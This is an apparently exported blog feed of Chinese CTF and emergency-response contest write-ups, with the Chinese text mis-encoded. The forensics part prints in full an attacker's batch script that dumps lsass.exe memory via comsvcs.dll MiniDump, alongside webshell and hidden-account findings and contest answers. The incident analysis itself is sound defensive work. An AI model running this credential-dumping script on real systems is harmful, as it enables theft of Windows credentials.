class="hljs-number">01110101</span> <span class="hljs-number">110001</span> <span class="hljs-number">110001</span> <span class="hljs-number">110001</span> <span class="hljs-number">110001</span><br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/bd8de3ecbdd7afa2.png"></p><p>æç¤ºæ ¼é›·ç ï¼Œä½†æ˜¯å…¶å®æ˜¯æ ¼é›·ç å˜ä½“ï¼Œå°†æ¯ä¸ªå—åˆ†å‰²æˆå¤šä¸ª 2 ä½ç»„ï¼Œä½¿ç”¨å¦‚ä¸‹æ˜ å°„è§„åˆ™å°†æ¯ä¸ª 2 ä½å¯¹è½¬æ¢ä¸º Base4 æ•°å­—å­—ç¬¦</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs 1c">&#x27;00&#x27; â†’ &#x27;0&#x27;<br><br>&#x27;01&#x27; â†’ &#x27;1&#x27;<br><br>&#x27;11&#x27; â†’ &#x27;2&#x27;<br><br>&#x27;10&#x27; â†’ &#x27;3&#x27;<br></code></pre></td></tr></table></figure><p>æœ€åæ‹¿åˆ°å¯†ç </p><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs erlang-repl">Welc0m3_T0_l3ve1_thr3e!!!!<br></code></pre></td></tr></table></figure><p>puzzlesolver è½¬å›¾ç‰‡</p><p><img src="https://img.dkdun.cn/v1/2025/12/2f6ba2e143967712.png"></p><p>ç„¶åæ‰«ç å¾—åˆ°</p><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs erlang-repl">y0u_g3t_th3_l4st_1ev3llllll!!!!!<br></code></pre></td></tr></table></figure><p>ç»™äº†ä¸€å †äºŒè¿›åˆ¶ç¢ç‰‡æ–‡ä»¶ï¼Œè¿™é‡Œé¢çš„æ–‡ä»¶åå¾ˆæœ‰æ„æ€ï¼Œæ¯ä¸ªæ–‡ä»¶åæ ¼å¼ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">bit</span>&gt;</span>.<span class="hljs-tag">&lt;<span class="hljs-name">index</span>&gt;</span><br></code></pre></td></tr></table></figure><p>ä¹Ÿå°±æ˜¯è¯´ 0.1 è¡¨ç¤º 0 åœ¨ç¬¬ 1 ä½ï¼Œ0.4 è¡¨ç¤º 0 åœ¨ç¬¬ 4 ä½ï¼Œä»¥æ­¤ç±»æ¨ï¼Œå°†æ‰€æœ‰æ–‡ä»¶çš„æ–‡ä»¶åæŒ‰ä½ç½®æ‹¼æ¥åœ¨ä¸€èµ·å½¢æˆçš„ç»“æœå°±ä¸º flag</p><p><img src="https://img.dkdun.cn/v1/2025/12/0143f794c1f2c4aa.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> re<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_bin_seq</span>(<span class="hljs-params">dir_name=<span class="hljs-string">&#x27;last_level&#x27;</span></span>):<br>    r = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&#x27;([01])\.(\d+)$&#x27;</span>)<br>    bits = []<br><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">with</span> os.scandir(dir_name) <span class="hljs-keyword">as</span> files:<br>            <span class="hljs-keyword">for</span> f <span class="hljs-keyword">in</span> files:<br>                m = r.fullmatch(f.name)<br>                <span class="hljs-keyword">if</span> m:<br>                    b, i = m.groups()<br>                    bits.append((<span class="hljs-built_in">int</span>(i), b))<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&quot;ç›®å½•é”™è¯¯æˆ–è¯»å–å¤±è´¥&quot;</span>)<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> bits:<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&quot;æ— åŒ¹é…æ–‡ä»¶&quot;</span>)<br><br>    bits.sort()<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join(b <span class="hljs-keyword">for</span> _, b <span class="hljs-keyword">in</span> bits)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">bits_to_txt</span>(<span class="hljs-params">bin_str</span>):<br>    l = <span class="hljs-built_in">len</span>(bin_str)<br>    add = (<span class="hljs-number">8</span> - l % <span class="hljs-number">8</span>) % <span class="hljs-number">8</span><br>    <span class="hljs-keyword">if</span> add:<br>        bin_str += <span class="hljs-string">&#x27;0&#x27;</span> * add<br><br>    hex_chunks = [<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">int</span>(bin_str[i:i+<span class="hljs-number">8</span>], <span class="hljs-number">2</span>))[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">2</span>)<br>                  <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(bin_str), <span class="hljs-number">8</span>)]<br>    raw = <span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-string">&#x27;&#x27;</span>.join(hex_chunks))<br>    <span class="hljs-keyword">return</span> raw.decode(errors=<span class="hljs-string">&#x27;ignore&#x27;</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>():<br>    <span class="hljs-keyword">try</span>:<br>        bseq = get_bin_seq()<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[info] è·å–é•¿åº¦: <span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(bseq)&#125;</span>&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[info] å†…å®¹é¢„è§ˆ: <span class="hljs-subst">&#123;bseq[:<span class="hljs-number">64</span>]&#125;</span>&quot;</span>)<br>        res = bits_to_txt(bseq)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n[+] FLAG:&quot;</span>, res)<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> why:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[err]&quot;</span>, why)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    run()<br><br></code></pre></td></tr></table></figure><p>æœ€åæ‹¼æ¥ç»“æœä¸º</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">011001100110110001100001011001110111101100111001001100100110010100110011001100100011000101100001001100010010110100110100001100110110000100110111001011010011001000110110001101100011000100101101011000010110011001100101001101000010110100110110001100010011001000110100001100110011000101100010001101110011100000110010011001100011001101111101</span><br></code></pre></td></tr></table></figure><p>flag ä¸º</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">92</span>e321a1-<span class="hljs-number">43</span>a7-<span class="hljs-number">2661</span>-afe4-<span class="hljs-number">612431</span>b782f3&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>æ¯”èµ›</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>2025å¹´Solaråº”æ€¥å“åº”å…¬ç›Šæœˆèµ›-7æœˆ</title>
    <link href="/2025/07/28/2025%E5%B9%B4Solar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%85%AC%E7%9B%8A%E6%9C%88%E8%B5%9B-7%E6%9C%88/"/>
    <url>/2025/07/28/2025%E5%B9%B4Solar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%85%AC%E7%9B%8A%E6%9C%88%E8%B5%9B-7%E6%9C%88/</url>
    
    <content type="html"><![CDATA[<p>ä¸å¾—ä¸è¯´è¿™æ¬¡é¢˜é‡æœ‰ç‚¹å¤§</p><span id="more"></span><h1 id="å–è¯ä¸“é¡¹"><a href="#å–è¯ä¸“é¡¹" class="headerlink" title="å–è¯ä¸“é¡¹"></a>å–è¯ä¸“é¡¹</h1><h2 id="ã€ä»»åŠ¡1ã€‘VOL-EASY"><a href="#ã€ä»»åŠ¡1ã€‘VOL-EASY" class="headerlink" title="ã€ä»»åŠ¡1ã€‘VOL_EASY"></a>ã€ä»»åŠ¡1ã€‘VOL_EASY</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">é»‘å®¢ä¸Šä¼ çš„ä¸€å¥è¯æœ¨é©¬å¯†ç æ˜¯å¤šå°‘ï¼Ÿ<br></code></pre></td></tr></table></figure><p>å¯¼å…¥ R-Studioï¼ŒTools ä¸‹æœ‰ä¸€ä¸ª ezshell.phpï¼Œæ‰¾åˆ°ä¸€å¥è¯æœ¨é©¬</p><p><img src="https://img.dkdun.cn/v1/2025/12/c80af839e9117e32.png"></p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">solar</span><br></code></pre></td></tr></table></figure><h2 id="ã€ä»»åŠ¡2ã€‘VOL-EASY"><a href="#ã€ä»»åŠ¡2ã€‘VOL-EASY" class="headerlink" title="ã€ä»»åŠ¡2ã€‘VOL_EASY"></a>ã€ä»»åŠ¡2ã€‘VOL_EASY</h2><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">é»‘å®¢ä½¿ç”¨çš„æœ¨é©¬è¿æ¥å·¥å…·å«ä»€ä¹ˆï¼ˆæ¯”å¦‚xx.exeï¼‰ï¼Ÿ<span class="hljs-comment">(ä»…é¦–å­—æ¯å¤§å†™)</span><br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/ba2ce2f19bd98aa6.png"></p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">Antsword.<span class="hljs-keyword">exe</span><br></code></pre></td></tr></table></figure><h2 id="ã€ä»»åŠ¡3ã€‘VOL-EASY"><a href="#ã€ä»»åŠ¡3ã€‘VOL-EASY" class="headerlink" title="ã€ä»»åŠ¡3ã€‘VOL_EASY"></a>ã€ä»»åŠ¡3ã€‘VOL_EASY</h2><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livescript">é»‘å®¢ä½¿ç”¨çš„æœ¨é©¬è¿æ¥å·¥å…·çš„ä½ç½®åœ¨å“ªé‡Œï¼ˆæ¯”å¦‚C:<span class="hljs-string">\xxxx\xx.exeï¼‰</span> ï¼Ÿ<br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">C</span>:\Tools\AntSword-Loader-v4.<span class="hljs-number">0</span>.<span class="hljs-number">3</span>-win32-x64\AntSword.exe<br></code></pre></td></tr></table></figure><h2 id="ã€ä»»åŠ¡4ã€‘VOL-EASY"><a href="#ã€ä»»åŠ¡4ã€‘VOL-EASY" class="headerlink" title="ã€ä»»åŠ¡4ã€‘VOL_EASY"></a>ã€ä»»åŠ¡4ã€‘VOL_EASY</h2><figure class="highlight ruleslanguage"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruleslanguage">é»‘å®¢è·å–åˆ°çš„<span class="hljs-keyword">FLAG</span>æ˜¯ä»€ä¹ˆï¼Ÿ<br></code></pre></td></tr></table></figure><p>Tools ä¸‹æœ‰ flag.txt</p><p><img src="https://img.dkdun.cn/v1/2025/12/0d07a7e4137a72f2.png"></p><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs erlang-repl">flag&#123;ok!get_webshell_is_good_idea~&#125;<br></code></pre></td></tr></table></figure><h2 id="ã€ä»»åŠ¡5ã€‘VOL-EASY"><a href="#ã€ä»»åŠ¡5ã€‘VOL-EASY" class="headerlink" title="ã€ä»»åŠ¡5ã€‘VOL_EASY"></a>ã€ä»»åŠ¡5ã€‘VOL_EASY</h2><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs 1c">é¢˜ç›®æè¿°<br>é»‘å®¢å…¥ä¾µçš„ç½‘ç«™åœ°å€æ˜¯å¤šå°‘ï¼ˆåªéœ€è¦http<span class="hljs-punctuation">:</span><span class="hljs-comment">//xxxxx/ï¼‰ï¼Ÿ</span><br></code></pre></td></tr></table></figure><p>åœ¨ lovelymem ä¸­æœç´¢ Administrator æ‰¾åˆ°äº†ç–‘ä¼¼ç½‘ç«™çš„ä¿¡æ¯</p><p><img src="https://img.dkdun.cn/v1/2025/12/1cb0eaebdfa763cd.png"></p><p>ç»§ç»­æœç´¢å­—ç¬¦ä¸² Administrator@<a href="http://0.0.0.192/">http://192</a></p><p><img src="https://img.dkdun.cn/v1/2025/12/0d4f5d73af50d58c.png"></p><p>æ‰¾åˆ°ç½‘ç«™</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">http:</span><span class="hljs-comment">//192.168.186.140</span><br></code></pre></td></tr></table></figure><h2 id="ã€ä»»åŠ¡6ã€‘VOL-EASY"><a href="#ã€ä»»åŠ¡6ã€‘VOL-EASY" class="headerlink" title="ã€ä»»åŠ¡6ã€‘VOL_EASY"></a>ã€ä»»åŠ¡6ã€‘VOL_EASY</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">é»‘å®¢å…¥ä¾µæ—¶ï¼Œä½¿ç”¨çš„ç³»ç»Ÿç”¨æˆ·åæ˜¯ä»€ä¹ˆï¼Ÿ<br></code></pre></td></tr></table></figure><p>æŸ¥çœ‹ç³»ç»Ÿä¿¡æ¯</p><p><img src="https://img.dkdun.cn/v1/2025/12/f1eb625ab75aa547.png"></p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">Administrator</span><br></code></pre></td></tr></table></figure><h2 id="ã€ä»»åŠ¡7ã€‘VOL-EASY"><a href="#ã€ä»»åŠ¡7ã€‘VOL-EASY" class="headerlink" title="ã€ä»»åŠ¡7ã€‘VOL_EASY"></a>ã€ä»»åŠ¡7ã€‘VOL_EASY</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">é»‘å®¢åˆ›å»ºéšè—è´¦æˆ·çš„å¯†ç æ˜¯å¤šå°‘ï¼Ÿ<br></code></pre></td></tr></table></figure><p>æœç´¢ net user å‘ç°åœ¨æ·»åŠ ç”¨æˆ· solar$</p><p><img src="https://img.dkdun.cn/v1/2025/12/9c96fab7ac010942.png"></p><p>ç»§ç»­æœç´¢ net user solar</p><p><img src="https://img.dkdun.cn/v1/2025/12/3e8a4cb94f06b6a8.png"></p><p>æˆåŠŸæ‰¾åˆ°å¯†ç </p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">solar2025<br></code></pre></td></tr></table></figure><h2 id="ã€ä»»åŠ¡8ã€‘VOL-EASY"><a href="#ã€ä»»åŠ¡8ã€‘VOL-EASY" class="headerlink" title="ã€ä»»åŠ¡8ã€‘VOL_EASY"></a>ã€ä»»åŠ¡8ã€‘VOL_EASY</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">é»‘å®¢é¦–æ¬¡æ“ä½œé¶æœºçš„å…³é”®ç¨‹åºæ˜¯ä»€ä¹ˆï¼Ÿ<br></code></pre></td></tr></table></figure><p>Tools ä¸‹æœ‰ä¸ª dump_lass.bat è„šæœ¬</p><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs dos">@<span class="hljs-built_in">echo</span> off<br><span class="hljs-built_in">echo</span> [*] æ­£åœ¨è·å– lsass.exe PID...<br><br><span class="hljs-keyword">for</span> /f &quot;tokens=<span class="hljs-number">2</span> delims=,&quot; <span class="hljs-variable">%%a</span> <span class="hljs-keyword">in</span> (&#x27;tasklist /FI &quot;IMAGENAME eq lsass.exe&quot; /FO CSV /NH&#x27;) <span class="hljs-keyword">do</span> (<br>    <span class="hljs-built_in">set</span> PID=<span class="hljs-variable">%%~</span>a<br>)<br><br><span class="hljs-keyword">if</span> &quot;<span class="hljs-variable">%PID%</span>&quot;==&quot;&quot; (<br>    <span class="hljs-built_in">echo</span> [!] æœªæ‰¾åˆ° lsass.exe è¿›ç¨‹ï¼Œæˆ–æ²¡æœ‰æƒé™ã€‚<br>    <span class="hljs-built_in">pause</span><br>    <span class="hljs-keyword">exit</span> /b <span class="hljs-number">1</span><br>)<br><br><span class="hljs-built_in">echo</span> [*] PID: <span class="hljs-variable">%PID%</span><br><span class="hljs-built_in">echo</span> [*] æ­£åœ¨å°è¯•å¯¼å‡ºå†…å­˜è½¬å‚¨...<br><br><span class="hljs-built_in">set</span> OUTPUT=%~dp0lsass.dmp<br><br>rundll32.exe comsvcs.dll, MiniDump <span class="hljs-variable">%PID%</span> <span class="hljs-variable">%OUTPUT%</span> full<br><br><span class="hljs-keyword">if</span> <span class="hljs-keyword">exist</span> &quot;<span class="hljs-variable">%OUTPUT%</span>&quot; (<br>    <span class="hljs-built_in">echo</span> [âœ“] æˆåŠŸå¯¼å‡º lsass å†…å­˜ä¸º: <span class="hljs-variable">%OUTPUT%</span><br>) <span class="hljs-keyword">else</span> (<br>    <span class="hljs-built_in">echo</span> [!] å¯¼å‡ºå¤±è´¥ï¼Œå¯èƒ½æƒé™ä¸è¶³ã€‚<br>)<br><br><span class="hljs-built_in">pause</span><br><br></code></pre></td></tr></table></figure><p>å¯¼å‡ºäº† lsass.exe çš„å†…å­˜ä¿¡æ¯ï¼ŒåŒ…å« PIDï¼Œè½¬å­˜è¾“å‡ºçš„è·¯å¾„ï¼Œ010 æ‰“å¼€é•œåƒæ–‡ä»¶æœç´¢ lsass.exeï¼Œæ‰¾åˆ°ç›¸å…³ä¿¡æ¯</p><p><img src="https://img.dkdun.cn/v1/2025/12/cb92e3f7e2256c60.png"></p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">lsass.<span class="hljs-keyword">exe</span><br></code></pre></td></tr></table></figure><h2 id="ã€ä»»åŠ¡9ã€‘VOL-EASY"><a href="#ã€ä»»åŠ¡9ã€‘VOL-EASY" class="headerlink" title="ã€ä»»åŠ¡9ã€‘VOL_EASY"></a>ã€ä»»åŠ¡9ã€‘VOL_EASY</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">è¯¥å…³é”®ç¨‹åºçš„PIDæ˜¯å¤šå°‘ï¼Ÿ<br></code></pre></td></tr></table></figure><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">456<br></code></pre></td></tr></table></figure><h2 id="ã€ä»»åŠ¡10ã€‘VOL-EASY"><a href="#ã€ä»»åŠ¡10ã€‘VOL-EASY" class="headerlink" title="ã€ä»»åŠ¡10ã€‘VOL_EASY"></a>ã€ä»»åŠ¡10ã€‘VOL_EASY</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">è¯¥å…³é”®ç¨‹åºçš„å†…å­˜æ–‡ä»¶ä¿å­˜åˆ°äº†ä»€ä¹ˆåœ°æ–¹ï¼Ÿ<br></code></pre></td></tr></table></figure><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">C:</span>\phpstudy_pro\WWW\lsass.dmp<br></code></pre></td></tr></table></figure><h1 id="åº”æ€¥å“åº”"><a href="#åº”æ€¥å“åº”" class="headerlink" title="åº”æ€¥å“åº”"></a>åº”æ€¥å“åº”</h1><h2 id="ã€ä»»åŠ¡1ã€‘åº”æ€¥å¤§å¸ˆ"><a href="#ã€ä»»åŠ¡1ã€‘åº”æ€¥å¤§å¸ˆ" class="headerlink" title="ã€ä»»åŠ¡1ã€‘åº”æ€¥å¤§å¸ˆ"></a>ã€ä»»åŠ¡1ã€‘åº”æ€¥å¤§å¸ˆ</h2><p><img src="https://img.dkdun.cn/v1/2025/12/89cb689a675bbd2f.png"></p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams">solar<span class="hljs-symbol">$</span><br></code></pre></td></tr></table></figure><h2 id="ã€ä»»åŠ¡2ã€‘åº”æ€¥å¤§å¸ˆ"><a href="#ã€ä»»åŠ¡2ã€‘åº”æ€¥å¤§å¸ˆ" class="headerlink" title="ã€ä»»åŠ¡2ã€‘åº”æ€¥å¤§å¸ˆ"></a>ã€ä»»åŠ¡2ã€‘åº”æ€¥å¤§å¸ˆ</h2><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm">è¯·æäº¤é»‘å®¢çš„<span class="hljs-built_in">IP</span>åœ°å€ï¼Ÿ<br></code></pre></td></tr></table></figure><p>æŸ¥çœ‹ nginx.log.txt æ–‡ä»¶æ‰¾åˆ° IP</p><p><img src="https://img.dkdun.cn/v1/2025/12/473f70b24773d0d0.png"></p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">192.168.186.139</span><br></code></pre></td></tr></table></figure><h2 id="ã€ä»»åŠ¡3ã€‘åº”æ€¥å¤§å¸ˆ"><a href="#ã€ä»»åŠ¡3ã€‘åº”æ€¥å¤§å¸ˆ" class="headerlink" title="ã€ä»»åŠ¡3ã€‘åº”æ€¥å¤§å¸ˆ"></a>ã€ä»»åŠ¡3ã€‘åº”æ€¥å¤§å¸ˆ</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">è¯·æäº¤é»‘å®¢çš„ä¸€å¥è¯æœ¨é©¬å¯†ç ï¼Ÿ<br></code></pre></td></tr></table></figure><p>uploads ç›®å½•ä¸‹æœ‰ä¸¤ä¸ª php æ–‡ä»¶</p><p><img src="https://img.dkdun.cn/v1/2025/12/39000dad2e1df55d.png"></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">solar2025<br></code></pre></td></tr></table></figure><h2 id="ã€ä»»åŠ¡4ã€‘åº”æ€¥å¤§å¸ˆ"><a href="#ã€ä»»åŠ¡4ã€‘åº”æ€¥å¤§å¸ˆ" class="headerlink" title="ã€ä»»åŠ¡4ã€‘åº”æ€¥å¤§å¸ˆ"></a>ã€ä»»åŠ¡4ã€‘åº”æ€¥å¤§å¸ˆ</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">è¯·æäº¤é»‘å®¢åˆ›å»ºéšè—ç”¨æˆ·çš„TargetSidï¼ˆç›®æ ‡è´¦æˆ·å®‰å…¨IDï¼‰ï¼Ÿ<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/bcc8e058e7960a25.png"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">S</span>-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">3845547894</span>-<span class="hljs-number">970975367</span>-<span class="hljs-number">1760185533</span>-<span class="hljs-number">1000</span><br></code></pre></td></tr></table></figure><h2 id="ã€ä»»åŠ¡5ã€‘åº”æ€¥å¤§å¸ˆ"><a href="#ã€ä»»åŠ¡5ã€‘åº”æ€¥å¤§å¸ˆ" class="headerlink" title="ã€ä»»åŠ¡5ã€‘åº”æ€¥å¤§å¸ˆ"></a>ã€ä»»åŠ¡5ã€‘åº”æ€¥å¤§å¸ˆ</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">è¯·æäº¤é»‘å®¢åˆ›å»ºéšè—è´¦æˆ·çš„äº‹ä»¶ï¼ˆæ ¼å¼ä¸º å¹´<span class="hljs-regexp">/æœˆ/</span>æ—¥ æ—¶:åˆ†:ç§’ï¼‰ï¼Ÿ<br></code></pre></td></tr></table></figure><p>æ‰“å¼€äº‹ä»¶æŸ¥çœ‹å™¨æŸ¥çœ‹å®‰å…¨æ—¥å¿—ï¼Œå‘ç°åœ¨ 2025&#x2F;7&#x2F;23 17:05:45 æ—¶è´¦æˆ·è¢«æ›´æ”¹ä¸º solar$</p><p><img src="https://img.dkdun.cn/v1/2025/12/a67a8300fecca4be.png"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">2025</span>/<span class="hljs-number">7</span>/<span class="hljs-number">23</span> <span class="hljs-number">17</span>:<span class="hljs-number">05</span>:<span class="hljs-number">45</span><br></code></pre></td></tr></table></figure><h2 id="ã€ä»»åŠ¡6ã€‘åº”æ€¥å¤§å¸ˆ"><a href="#ã€ä»»åŠ¡6ã€‘åº”æ€¥å¤§å¸ˆ" class="headerlink" title="ã€ä»»åŠ¡6ã€‘åº”æ€¥å¤§å¸ˆ"></a>ã€ä»»åŠ¡6ã€‘åº”æ€¥å¤§å¸ˆ</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">é»‘å®¢å°†è¿™ä¸ªéšè—ç”¨æˆ·å…ˆååŠ å…¥äº†å“ªå‡ ä¸ªç”¨æˆ·ç»„ï¼Ÿæäº¤æ ¼å¼ä¸º ç¬¬ä¸€ä¸ªç”¨æˆ·ç»„-ç¬¬äºŒä¸ªç”¨æˆ·ç»„ï¼Œå¦‚student-teacher<br></code></pre></td></tr></table></figure><p>å¯ä»¥å‘ç°å…ˆåæ·»åŠ äº†ä¸¤ä¸ªç”¨æˆ·ç»„</p><p><img src="https://img.dkdun.cn/v1/2025/12/cdc0c17879d19d88.png"></p><p><img src="https://img.dkdun.cn/v1/2025/12/9057281cc607cdb7.png"></p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">Users-Administrators</span><br></code></pre></td></tr></table></figure><h2 id="ã€ä»»åŠ¡7ã€‘åº”æ€¥å¤§å¸ˆ"><a href="#ã€ä»»åŠ¡7ã€‘åº”æ€¥å¤§å¸ˆ" class="headerlink" title="ã€ä»»åŠ¡7ã€‘åº”æ€¥å¤§å¸ˆ"></a>ã€ä»»åŠ¡7ã€‘åº”æ€¥å¤§å¸ˆ</h2><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 